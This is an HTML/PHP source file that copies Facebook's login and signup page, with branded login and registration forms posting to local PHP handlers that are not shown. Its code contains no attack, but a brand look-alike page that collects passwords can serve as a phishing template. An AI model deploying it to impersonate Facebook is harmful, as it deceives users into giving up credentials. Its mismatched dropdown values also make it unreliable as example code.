<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>facebook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="stylesheet" href="css/fuck.css">
  </head>
  <body>
      <!-- Top Nav Bar -->
      <div class="fb-navbar">
        <div class="fb-navbar-in">
          <div class="row">
            <div class="col-sm-6">
              <!-- Left Icon -->
              <div class="fb-icon">
                <div class="fb-icon-in">
                  <a class="nav-link text-white" href="www.facebook.com">facebook</a>
                </div>
              </div>
            </div>
            <div class="col-sm-6 my-column">
              <!-- Right Login Inputs-->

              <form class="" action="" method="post">
                
                <div class="fb-login">
                <div class="fb-login-in">
                  <table>
                    <tr class="login-title">
                      <td class="text-white">Email or Phone</td>
                      <td class="text-white">Password</td>
                    </tr>
                    <tr class="login-input">
                      <td><input type="email" name="fb-login-email" value="" required="required"></td>
                      <td><input type="password" name="fb-login-password" value="" required="required"></td>
                      <td><input class="btn text-white login-btn" type="submit" name="fb-login" value="Log In"></td>
                    </tr>
                    <?php
                      include("signin.php");
                    ?>
                    <tr class="forget-password">
                      <td></td>
                      <td><a class="nav-link" href="forget_password.php">Forget account?</a></td>
                    </tr>
                  </table>
                </div>
              </div>
            </form>
              
            </div>
          </div>
        </div>
      </div>

      

      <div class="signup-section">
        <div class="signup-section-in">
          <div class="container-fluid my-container">
            <div class="row">
              <!-- Left Section Information -->
              <div class="col-sm-7 pl-0">
                <div class="signup-left-top">
                  <h2>Connect with friends and the <br> world around you on Facebook.</h2>
                </div>
                <div class="signup-left-bottom">
                  <div class="signup-left-bottom-box">
                    <span><img src="img/log.png" alt=""></span>
                    <span class="signup-left-content">See Photos and Updates</span>
                    <span>from friends in News Feed.</span>
                  </div>
                  <div class="signup-left-bottom-box">
                    <span><img src="img/star.png" alt=""></span>
                    <span class="signup-left-content">Share what's new</span>
                    <span>in your life on your Timeline.</span>
                  </div>
                  <div class="signup-left-bottom-box">
                    <span><img src="img/star.png" alt=""></span>
                    <span class="signup-left-content">Find more</span>
                    <span>of what you're looking for with Facebook Search.</span>
                  </div>
                </div>
              </div>

              <!-- Main Right Section -->
              <!-- Right Secion Information -->
              <div class="col-sm-5 pl-1 pr-0">
                <div class="signup-right">
                  <div class="signup-right-top">
                    <h2 class="">Sign Up</h2>
                    <div>It’s quick and easy.</div>
                  </div>

                  <!-- Middle Information -->
                  <div class="signup-right-middle">
                    <form class="" action="" method="post">
                      <div class="signup-top-input">
                        <div class="row">
                          <div class="col-sm-6 pr-1">
                            <input class="form-control" type="text" name="fname" value="" placeholder="First name" required="required">
                          </div>
                          <div class="col-sm-6 pl-2">
                            <input class="form-control" type="text" name="lname" value="" placeholder="Last name" required="required">
                          </div>
                        </div>
                      </div>

                      <div class="signup-middle-input">
                        <input class="form-control mt-2 mb-2" type="email" name="fb-email" value="" placeholder="Mobile number or email" required="required">
                        <input class="form-control mt-2 mb-2" type="password" name="fb-password" value="" placeholder="New password" required="required">
                      </div>

                      <div class="signup-bottom-input mb-3">
                        <div class="fb-birthday">
                          <div class="fb-birthday-text">Birthday</div>
                          <div class="fb-birthday-date">
                            <!-- Months -->
                            <select class="fb-month" name="fb-month">
                              <option value="">Month</option>
                              <option value="jan">Jan</option>
                              <option value="feb">Feb</option>
                              <option value="mar">Mar</option>
                              <option value="apr">Apr</option>
                              <option value="may">May</option>
                              <option value="jun">Jun</option>
                              <option value="jul">Jul</option>
                              <option value="aug">Aug</option>
                              <option value="sep">Sep</option>
                              <option value="oct">Oct</option>
                              <option value="nov">Nov</option>
                              <option value="12" selected>Dec</option>
                            </select>

                            <!-- Day -->

                            <select class="fb-day" name="fb-day">
                              <option value="">Day</option>
                              <option value="jan">1</option>
                              <option value="feb">2</option>
                              <option value="mar">3</option>
                              <option value="apr">4</option>
                              <option value="may">5</option>
                              <option value="jun">6</option>
                              <option value="jul">7</option>
                              <option value="aug">8</option>
                              <option value="sep">9</option>
                              <option value="oct">10</option>
                              <option value="nov">11</option>
                              <option value="dec">12</option>
                              <option value="dec">13</option>
                              <option value="dec">14</option>
                              <option value="dec">15</option>
                              <option value="dec">16</option>
                              <option value="dec">17</option>
                              <option value="dec">18</option>
                              <option value="dec">19</option>
                              <option value="dec">20</option>
                              <option value="dec">21</option>
                              <option value="dec">22</option>
                              <option value="dec">23</option>
                              <option value="dec">24</option>
                              <option value="25" selected>25</option>
                              <option value="dec">26</option>
                              <option value="dec">27</option>
                              <option value="dec">28</option>
                              <option value="dec">29</option>
                              <option value="dec">30</option>
                              <option value="dec">31</option>
                            </select>

                            <!-- Year -->
                            <select class="fb-year" name="fb-year">
                              <option value="">Year</option>
                              <option value="jan">2019</option>
                              <option value="feb">2018</option>
                              <option value="mar">2017</option>
                              <option value="apr">2016</option>
                              <option value="may">2015</option>
                              <option value="jun">2014</option>
                              <option value="jul">2013</option>
                              <option value="aug">2012</option>
                              <option value="sep">2011</option>
                              <option value="oct">2010</option>
                              <option value="nov">2009</option>
                              <option value="dec">2008</option>
                              <option value="dec">2007</option>
                              <option value="dec">2006</option>
                              <option value="dec">2005</option>
                              <option value="2004" selected>2004</option>
                            </select>

                            <span class="birthday-help ml-2">
                              <i class="fas fa-question-circle"></i>
                            </span>

                          </div>
                        </div>

                        <div class="fb-gender">
                          <div class="fb-gender-text">Gender</div>
                          <div class="fb-gender-icon pl-1 pr-1">
                            <span class="fb-gender-box"><input type="radio" name="fb-gender" value="female" required="required"><label>Female</label></span>
                            <span class="fb-gender-box"><input type="radio" name="fb-gender" value="male" required="required"><label>Male</label></span>
                            <span class="fb-gender-box"><input type="radio" name="fb-gender" value="custom" required="required"><label>Custom</label></span>
                            <span class="gender-help ml-2">
                              <i class="fas fa-question-circle"></i>
                            </span>
                          </div>
                          <div class="fb-gender-info mt-1 mb-1">
                            <span>By clicking Sign Up, you agree to our <a href="terms.php">Terms</a>, <a href="dataPolicy.php">Data Policy</a> and
                               <a href="#">Cookies Policy.</a> You may receive SMS Notifications from us and  can opt out any time.
                            </span>
                          </div>
                        </div>

                        <div class="fb-sign-up-button">
                          <input class="btn mt-3 mb-4 text-white" type="submit" name="fb-signup-button" value="Sign Up">
                        </div>
                        <?php
                            include("signup.php");
                        ?>
                     
                        <div class="fb-create-page pt-2 pb-2">
                          <span><a href="#">Create a Page</a> for a celebrity, band or business.</span>
                        </div>

                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="fb-footer">
        <div class="fb-footer-in">
          <div class="fb-footer-top">
            <ul>
               <li><a class="fb-footer-active" href="#">English (US)</a></li>
               <li><a href="#">नेपाली</a></li>
               <li><a href="#">हिन्दी</a></li>
               <li><a href="#">Español</a></li>
               <li><a href="#">Português</a></li>
               <li><a href="#">(Brasil)</a></li>
               <li><a href="#">日本語</a></li>
               <li><a href="#">Français(France)</a></li>
               <li><a href="#">Deutsch</a></li>
               <li><a href="#">Italiano</a></li>
               <li><a href="#">العربية</a></li>
               <li><a href="#">中文(简体)</a></li>
               <li><i class="fas fa-plus"></i></li>
            </ul>
          </div>
          <div class="fb-footer-hr"></div>
          <div class="fb-footer-bottom">
            <ul>
               <li><a href="#">Sign Up</a></li>
               <li><a href="#">Log In</a></li>
               <li><a href="#">Messenger</a></li>
               <li><a href="#">Facebook Lite</a></li>
               <li><a href="#">Watch</a></li>
               <li><a href="#">People</a></li>
               <li><a href="#">Pages</a></li>
               <li><a href="#">Page Categories</a></li>
               <li><a href="#">Places</a></li>
               <li><a href="#">Games</a></li>
               <li><a href="#">Locations</a></li>
               <li><a href="#">Marketplace</a></li>
               <li><a href="#">People</a></li>
               <li><a href="#">Groups</a></li>
               <li><a href="#">Instagram</a></li>
               <li><a href="#">Local</a></li>
               <li><a href="#">Fundraisers</a></li>
               <li><a href="#">Services</a></li>
               <li><a href="#">About</a></li>
               <li><a href="#">Create Ad</a></li>
               <li><a href="#">Create Page</a></li>
               <li><a href="#">Developers</a></li>
               <li><a href="#">Careers</a></li>
               <li><a href="#">Privacy</a></li>
               <li><a href="#">Cookies</a></li>
               <li><a href="#">Ad Choices<i class="fas fa-play pl-1"></i></a></li>
               <li><a href="#">Terms</a></li>
               <li><a href="#">Help</a></li>
            </ul>
          </div>
          <div class="fb-footer-copyright">
            <span>Facebook © 2019</span>
          </div>
        </div>
      </div>

    <!-- Javascript Links -->
    <script type="text/javascript" src="bootstrap/js/jquery.js"></script>
    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
  </body>
</html>
